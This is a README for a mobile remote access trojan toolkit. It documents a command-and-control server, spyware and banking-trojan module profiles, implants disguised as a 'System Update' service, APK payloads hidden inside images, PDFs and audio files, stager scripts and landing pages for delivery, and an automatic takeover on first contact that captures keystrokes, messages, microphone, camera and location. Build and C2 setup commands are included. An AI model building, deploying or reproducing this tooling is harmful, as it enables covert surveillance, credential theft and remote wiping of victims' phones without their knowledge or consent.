# hackit rat — multi-vector phone implant, C2 and operator bench

One bench, five delivery paths: **APK**, **carrier files**, **web agent (iOS +
Android)**, **native channel (C++/NDK)** and **installer stagers**. Every path
lands in the same SQLite store and the same operator UI.

```
                    ┌─────────────── C2 (aiohttp) ───────────────┐
APK  ──HTTPS sealed──▶  /v1/beacon   tasks ⇄ results            │
.so  ──UDP sealed───▶  native port   (ChaCha20-Poly1305)        │──▶ SQLite
Web  ──JSON HTTPS──▶  /v1/web/<token>  PWA agent (iOS)          │──▶ live UI
Files├─carriers─────▶  install.sh / carve.py → same APK         │
Stager┄public URL──▶  /dl/<token>/ landing + apk + profile      ┘
```

## Specs

`spec` is not a label — it is the module list baked into the APK. The
dispatcher refuses anything outside it, and the operator UI shows the same
refusal.

| spec | modules on top of core |
|---|---|
| rat | everything |
| trojan | keylog, sms, calls, contacts, loc, notif, files, shell, apps, native |
| spyware | keylog, notif, loc, clip, screen, mic, usage, native |
| malware | everything (full takeover profile) |
| stealer | sms, calls, contacts, accounts, wifi, files, apps |
| banker | keylog, notif, clip, apps, screen |
| bot | shell, files, apps, native |
| minimal | core only |

## Toolchain

```bash
hackit rat setup          # installs command-line tools, platform, build-tools
hackit rat doctor         # report readiness (--install to repair)
```

`setup` finds a JDK, downloads the official command-line tools, accepts the
licences and installs `platforms;android-35` + `build-tools;35.0.0` + NDK into
`~/Android/Sdk`, then remembers the path. `make app` runs the same bootstrap
automatically when discovery is empty, so a fresh machine builds on the first
command. Discovery order: `ANDROID_HOME`, `ANDROID_SDK_ROOT`,
`HACKIT_ANDROID_SDK`, the remembered path, conventional locations.

## Menu (no flags)

```bash
hackit rat
```

Status panel, grouped command rail, then a plain input loop:

| input | effect |
|---|---|
| `inject <spec> <file>` | hide a sealed payload inside that file (photo.jpg, doc.pdf, song.mp3, …) |
| `make app [name] [spec]` | build the APK for a spec |
| `make installer [spec]` | offline USB bundle: APK + setup.bat + setup.sh + deploy.txt, zipped |
| `make file <ext> [carrier]` | hide the APK in one carrier format |
| `make stager [host]` | stager.sh, install.ps1, landing page, iOS profile |
| `make ios [url]` | `.mobileconfig` WebClip + PWA URL |
| `tunnel [provider]` | public URL via cloudflared / ngrok / ssh |
| `run` | full-screen operator UI (spec-aware: out-of-spec commands are refused) |
| `sessions` / `doctor` / `setup` / `help` / `quit` | support verbs |

Scripted equivalents stay available: `hackit rat doctor|keygen|build|serve|
console|run|send|sessions|dump|mint|tunnel`.

## Operator UI (`run`)

`hackit rat run` binds the C2 and draws a live screen: sessions with kind
badge, battery and IP on the left; event feed and keylogger tail on the right;
last location, active tasks and a command line underneath. Keys:

`1-9` select · `j/k` move · `s` screenshot · `v` stream · `m` mic 15 s ·
`c` photo · `i` info · `l` locate · `g` keylog · `a` apps · `p` perms ·
`f <dir>` · `P <path>` · `x <cmd>` · `t <msg>` · `b` buzz · `T` takeover ·
`K` lock · `W` wipe · `r` refresh · `h` help · `q` quit.

Without a TTY it degrades to a line feed, so it is still scriptable.

## Delivery paths

### 1. APK

Java 8 implant, `minSdk 21` (Android 5.0) → `targetSdk 35` (Android 15).
Foreground service labelled *System Update*, watchdog thread that restarts a
dead poll loop, boot + alarm + job + recents-swipe restart, optional device
admin (lock / wipe), launcher alias that can be switched off.

**First contact is the takeover.** The moment a device registers, the C2 claims
it and queues the whole playbook: identity, permission state, every collector
the spec allows, live location tracking, keylog/notification/clipboard dumps,
`/sdcard` listing, icon hiding and the screen stream. A one-shot on-device
wizard walks the permissions Android will not grant silently. The sleep is
dropped to 20 s while the playbook drains; `T` re-runs it later.

Collectors: SMS (live observer), calls, contacts, location (fix + continuous),
notifications, accessibility keylogger, clipboard, files (ls/pull/push with
8 MB chunking), microphone (AAC), camera (JPEG with orientation fix), screen
(MediaProjection), installed apps, Wi-Fi, accounts, device inventory, shell
(30 s / 512 KB cap).

### 2. Carrier files

The APK is appended after the real container data (or packed as an OPC part
for docx, base64 metadata for svg). A 25-byte trailer (`HACKITRATZIP1` + 8-byte
length + tail) locates the payload, so `carve.py`, `install.sh` and
`install.bat` extract it without scanning.

Verified with real files: JPEG/PNG/WebP decode in Pillow, MP3/MP4 demux in
ffprobe, PDF text extraction in pdftotext, DOCX zip integrity, SVG parses as XML.

### 3. Web agent (iOS and Android)

`hackit rat make ios` writes an unsigned `.mobileconfig` WebClip; open
`/w/<token>/` once and the PWA installs. The agent reports device/build
strings, screen, timezone, network, battery (Safari), geolocation, camera,
5 s microphone clip and clipboard (gesture), every 30 s and on demand.
Artifacts arrive base64 and are decoded into the loot folder. It cannot read
SMS or files — that is the browser boundary, not a bug.

### 4. Native channel (C++)

`hackit/rat/native/` builds `libhackit.so` for arm64-v8a, armeabi-v7a and
x86_64 with the NDK (CMake). It carries high-rate events over UDP with its own
ChaCha20-Poly1305 (RFC 8439, no OpenSSL), bounded queue, exponential reconnect
and probes read straight from `/proc`: injection markers, TracerPid/seccomp,
sockets, mounts, CPU/memory, process list, plus an inotify watcher.

JNI calls from the implant: `nativeInit`, `nativeSend`, `nativeState`,
`nativeProbe`, `nativeWatch`, `nativeWatchDrain`, `nativeStop`. If the library
is missing or blocked, the HTTP path is untouched.

The same probes compile as a host binary: `stalker status|snapshot|net|maps|
mounts|cpu|proc|watch <dir>|selftest`.

### 5. Stagers and tunnels

`make stager` emits an installer script, a PowerShell variant, a landing page
and the iOS profile, all pointing at `/dl/<token>/agent.apk`. `make tunnel`
publishes the C2 through cloudflared/ngrok/ssh so the same URL works from a
different network.

## Ports

| port | use |
|---|---|
| `<http>` | HTTPS beacon, dashboard, `/v1/web`, `/w`, `/dl` |
| `<http> + 100` | native UDP (ChaCha20-Poly1305, sealed) |
| 1080 | SOCKS5 proxy (`--socks`) for operator traffic |

## Build

```bash
hackit rat doctor        # JDK 17+, SDK 35, build-tools 35, NDK, cmake
hackit rat keygen --host https://c2.example.com
hackit rat build         # apk + libhackit.so x3 ABIs
```

Engine `sdk` is offline (aapt2 → javac → d8 → zipalign → apksigner). Engine
`gradle` uses AGP + R8 when Gradle is installed. `doctor` names whatever is
missing and the sdkmanager package that fixes it.

## Layout

```
hackit/rat/
  menu.py       bare `hackit rat` loop (make apk/file/stager/ios, tunnel, run)
  ui.py         full-screen operator UI
  polyglot.py   carrier injection + carve + launchers
  samples.py    embedded valid carriers for bare boxes
  ios.py        WebClip profile, PWA manifest, service worker
  webagent.py   browser agent page + JS
  stager.py     installer scripts, landing page, delivery manifest
  tunnel.py     cloudflared / ngrok / ssh reverse
  builder.py    config bake + sdk/gradle engines + native build
  server.py     beacon, upload, web agent, UDP, dashboard, operator API
  native/       C++17 engine (AEAD, transport, probes, JNI, host stalker)
  template/     Android project (Java 8, min 21, target 35)
  tests/        pytest suite (crypto, store, carriers, ios, udp, web)
```

## Notes

- Tasks are handed out atomically (`delivered`); stale tasks requeue after 180 s.
- Outbox queues are capped (2000 events, 256 results).
- Jitter ±30 % with backoff to 5 minutes; native probes every 5 minutes.
- `screenshot` needs a one-time MediaProjection consent from the setup page.
- MP3 carriers keep playing; size-estimating tools may show a longer duration
  because bytes are appended after the last frame.